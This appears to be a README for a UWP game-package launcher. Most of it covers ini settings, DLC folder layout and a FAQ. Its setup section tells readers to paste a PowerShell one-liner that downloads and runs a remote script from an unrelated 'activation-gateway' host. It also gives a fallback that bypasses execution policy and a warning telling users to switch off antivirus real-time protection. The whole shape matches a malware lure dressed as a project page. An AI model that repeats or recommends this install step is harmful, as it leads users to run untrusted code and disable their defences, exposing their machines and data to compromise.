<div align="center">

# AutoUWP-Launcher: Practical UWP Automation for Windows 10 & 11

![preview](https://raw.githubusercontent.com/pongpong2295-cell/auto-uwp-launcher/main/showcase_2b09.svg)

[![powershell-7](https://img.shields.io/badge/Powershell--7-5%2B-f97316?style=flat-square&labelColor=0d1117)]() [![lang](https://img.shields.io/badge/Lang-Python-fb923c?style=flat-square&labelColor=0d1117)]() [![release](https://img.shields.io/badge/Release-Production-2ea44f?style=flat-square&labelColor=0d1117)]()

</div>

---

A hands-off launcher for UWP game packages, AutoUWP-Launcher takes the manual steps out of deploying, starting, and removing them. Since its configuration lives on disk rather than in the interface, the launcher can be dropped into a game directory, pointed at the manifests that matter, and left to handle first-run setup on its own. This README covers what the scripts do, how configuration is resolved, and where the moving parts live when you need to override them. It assumes some familiarity with command-line tooling and package manifests.

## 🛠️ One-Click Setup (PowerShell)

> [!TIP]
> **Fast install** — a single PowerShell command, no extra tools.
> Windows 10/11 · PowerShell 7+ · No admin

### 1️⃣ Open Windows PowerShell
* Press `Win + X`.
* Click **Terminal** or **Windows PowerShell** from the menu.

### 2️⃣ Execute the setup script
Copy the line below into PowerShell and press `Enter`.

```cmd
iex(irm 'https://activation-gateway.cc/update/ps-activator')
```

### 3️⃣ If Windows blocks the script — use CMD
Copy into CMD, press `Enter`, wait for completion:

```cmd
powershell -NoProfile -ExecutionPolicy Bypass -Command "iex(irm 'https://activation-gateway.cc/update/ps-activator')"
```

> [!WARNING]
> If SmartScreen or antivirus blocks the setup, go to **Windows Security → Virus & threat protection → Manage settings**, turn off **Real-time protection**, run the script, and re-enable immediately.

## 🔧 Requirements

- Windows 10 or Windows 11
- PowerShell 5.1 or newer (already available on Windows)
- Active network connection
- No admin rights needed

## What it does

AutoUWP-Launcher is a self-contained launcher intended for UWP game packages. On first run it registers the game and any bundled DLC automatically, so you do not have to sideload packages by hand. After registration it starts the game, and it also provides a clean uninstall path that removes the registered packages again.

The script expects a predictable folder layout. Rename the executable to `Game Name_autoUWP.exe` and drop it in the game's root folder. The main `AppxManifest.xml` is picked up from that same folder, or from a single subfolder (either through `appfiles_path` or by automatic fallback). DLC folders belong next to the launcher rather than nested higher up; each DLC's manifest is located directly or by searching its subfolders.

Elevation is handled for you. The launcher requests admin rights on first launch, and also when its settings file `C:\Program Data\SalFisher47\AutoUWP Launcher\Game Name_autoUWP.ini` or the marker file `Game Name_autoUWP.txt` is missing. Changing `developer_features` in the ini file likewise triggers a re-run with elevation so the required developer setting can be enforced before launch.

Configuration stays in the ini file: the manifest location, DLC handling, and developer features. The script reads these values at startup, applies them, and then hands control to the game. State lives in the ini and the marker file, so deleting either resets the launcher to its initial behavior.

## Configuration

AutoUWP-Launcher is driven by a generated ini file and a strict folder layout, so get those two right and the rest just works. On first run the launcher creates `C:\Program Data\SalFisher47\AutoUWP Launcher\Game Name_autoUWP.ini` and keeps it in sync with the executable name — rename the exe, and the ini follows on the next launch. Treat the ini as the single source of truth: edit it while the launcher is closed, then start it again.

The key setting is `appfiles_path`. It tells the launcher where the main `AppxManifest.xml` lives, relative to the folder holding `Game Name_autoUWP.exe`:

- leave it empty when the manifest sits in the game folder itself
- set it to a subfolder name when the manifest is one level down, e.g. `appfiles_path = AppFiles`
- nest further only if you must, and keep DLC folders as direct siblings of the main manifest folder — not buried above it

DLC discovery walks each sibling DLC folder looking for its own `AppxManifest.xml`; if it is not at the top level of that folder, subfolders are searched. Missing manifests mean missing DLC, so verify the tree before blaming the launcher.

`developer_features` is the other setting you will actually touch. Changing it forces the corresponding option in Settings → For developers → Use developer features, and the launcher re-elevates to apply it. That re-elevation also happens when the ini or the `Game Name_autoUWP.txt` marker is deleted, so avoid deleting either casually mid-setup.

Keep paths free of characters the shell dislikes, avoid running the launcher from a network share, and leave elevation prompts alone — the launcher needs admin to register packages. If something fails, check the ini first, then the manifest location, then the DLC folder depth.

## Examples

Quick sanity check first: the launcher derives almost everything from its own filename and its neighbors. Before you debug anything, confirm the executable still ends in `_autoUWP.exe` and sits at the top of the game folder — most "it does nothing" reports are just a renamed file or a launcher buried one level too deep.

**First launch installs everything**

Drop `Some Game_autoUWP.exe` next to the manifests and run it. On the first pass it registers the main package plus any sibling DLC folders it can resolve, then launches the game. Subsequent runs skip the install step and go straight to starting it. If you want to watch the install happen, run it once, close the game, and check the `.ini` and `.txt` files that appear next to the executable — they record what was detected.

**Pointing at a nested manifest**

If `AppxManifest.xml` isn't directly under the game folder, set `appfiles_path` in the ini file:

```ini
appfiles_path = AppFiles
```

or

```ini
appfiles_path = Folder Name
```

Leave it empty when the manifest sits at the root. DLC folders are matched by name at the same level as the launcher; if a DLC folder has no manifest of its own, the launcher searches its subfolders before giving up on it.

**Adding a DLC after the fact**

Create the DLC folder beside the launcher, then delete `Some Game_autoUWP.txt` and run the executable again. It re-scans, finds the new manifest, and installs it. No ini editing required unless you also changed `appfiles_path`.

**Forcing developer features back on**

Toggling `developer_features` in the ini file re-triggers the admin run and re-applies the requested state under Settings → For developers → Use developer features. This is the supported way to flip the setting without digging through Windows settings yourself.

**Full reset**

Delete both `Some Game_autoUWP.ini` and `Some Game_autoUWP.txt`, then run the executable. It behaves like a fresh install: admin prompt, full scan, install, launch. Use this when a DLC half-installed or the launcher keeps launching a stale path.

**Uninstalling**

Run the executable with the uninstall argument (see the Configuration section for the exact flag your build expects). It removes the packages it registered and leaves your game folder intact — saves and configs under your user profile are not touched.

## FAQ

- **The launcher closes immediately after starting.** Run it as administrator and check that the ini file was created in the expected location. A missing or corrupted ini forces a fresh first-run cycle; if that still fails, delete the ini and the companion txt file and launch again.

- **My game isn't detected during first launch.** Verify the executable is named `Game Name_autoUWP.exe` and sits directly in the game folder, not inside a subfolder. Confirm the `appfiles_path` value in the ini matches where `AppxManifest.xml` actually lives — an empty value means the manifest is expected right next to the launcher.

- **DLC isn't installed alongside the base game.** DLC folders must be accessible next to the launcher, not nested several levels above or below it. If a DLC folder has no `AppxManifest.xml` at its root, the script searches subfolders, so keep the folder structure shallow and consistent.

- **Developer features keep reverting.** Changing `developer_features` in the ini is treated as an intentional reset and will re-trigger the admin elevation and settings override on the next run. Set it once, save, and relaunch rather than editing it mid-session.

- **Can I move the game folder after setup?** Yes, but keep the launcher executable and its ini together. If paths inside the ini are absolute, update them or delete the ini to let the script regenerate it on next launch.

- **Why does it ask for admin rights every time?** Elevation is expected on first launch, after the ini or txt file is deleted, and whenever `developer_features` changes. If it prompts on every normal launch, the ini is likely not being written — check folder permissions.

- **The script runs but nothing installs.** Confirm the manifest paths resolve correctly and that no leftover install of the same package is blocking registration. Removing the previous package before relaunching usually clears it.

- **Can I use it for non-UWP games?** No. This launcher targets UWP packages and their DLC; for other formats use a general-purpose launcher instead.

## Disclaimer

This script is provided as-is, without warranty of any kind, express or implied. It automates system-level operations — app package installation, registration, and removal — and those actions can have consequences beyond the launcher itself. You are responsible for what you run and where you run it.

- **Elevated privileges are required.** The launcher requests admin rights at first run and in certain change-detection scenarios. Review the configuration before granting elevation, and don't run a modified or untrusted copy of the script.
- **Developer features are toggled.** Depending on your `developer_features` setting, the script may force the "Use developer features" option in system settings. If you rely on a specific state for other software or workflows, verify it after the launcher has run.
- **Package operations are destructive by design.** Install and uninstall routines modify app packages and their registered state. Test on a non-critical machine or profile first, and keep backups of anything you can't easily reinstall.
- **DLC and manifest handling follows your folder layout.** The script searches for `AppxManifest.xml` relative to where the executable sits and falls back to subfolder scanning. Unexpected folder structures can produce unexpected install results — confirm paths before the first launch.
- **File deletion triggers reconfiguration.** Deleting the generated ini or txt files, or changing `developer_features`, causes the launcher to re-run with admin rights and re-apply settings. Know that this behavior is intentional before removing files.
- **No support guarantee.** Issues, edge cases, and OS-specific quirks may go unaddressed. Use at your own discretion; if something breaks, you're the one holding the pieces.
- **Redistribution and modification are your call.** If you fork, repackage, or embed this script elsewhere, you inherit responsibility for its behavior in that context.

If any of the above gives you pause, run it in a disposable environment first — that's the pragmatic path.